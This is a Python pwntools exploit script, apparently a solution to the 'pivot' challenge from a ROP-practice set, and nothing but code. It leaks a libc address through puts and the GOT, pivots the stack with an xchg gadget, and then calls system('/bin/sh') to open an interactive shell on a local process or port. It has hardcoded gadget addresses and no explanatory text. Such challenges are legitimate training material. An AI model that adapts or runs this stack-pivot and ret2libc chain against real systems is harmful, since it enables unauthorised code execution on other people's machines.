#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./pivot')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./pivot', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./pivot')
r = start()
#========= exploit here ===================
#leak
initial_foot = 0x400720
poprdi = 0x400a33
r.recvuntil("pivot: ")
pivot = int(r.recvline(),16)
log.info("pivot = {}".format(hex(pivot)))
#ret2win = pivot + 0x3f2b71

puts_got = 0x601020
puts_plt = 0x4006e0
main = 0x400847
ret = 0x4008f0

#======== parte (leak+pivot) 1 =======
#ropchain

ropchain = p64(poprdi)
ropchain += p64(0x601050)
ropchain += p64(puts_plt)
ropchain += p64(ret)
ropchain += p64(main)
r.sendlineafter(">", ropchain)

#payload
payload = "A" * 40
payload += p64(0x4009bb) #pop rax
payload+= p64(pivot) 
payload += p64(0x4009bd) #xchg
r.sendafter(">", payload)


#========= parte 2 (shell + pivot)
#leak2

r.recvline()
setvbuf = u64(r.recv(8)[:6].ljust(8,"\x00"))
log.info("setvbuf = {}".format(hex(setvbuf)))
libc.address = setvbuf -0x81360
log.info("libc  = {}".format(hex(libc.address)))
r.recvuntil("pivot: ")
pivot2 = int(r.recvline(),16)
log.info("pivot2 = {}".format(hex(pivot2)))

ropchain = p64(poprdi)
ropchain += p64(next(libc.search("/bin/sh")))
ropchain += p64(libc.sym.system)
r.sendlineafter(">", ropchain)

#payload
payload = "A" * 40
payload += p64(0x4009bb) #pop rax
payload += p64(pivot2) 
payload += p64(0x4009bd) #xchg
r.sendlineafter(">", payload)


#========= interactive ====================
r.interactive()
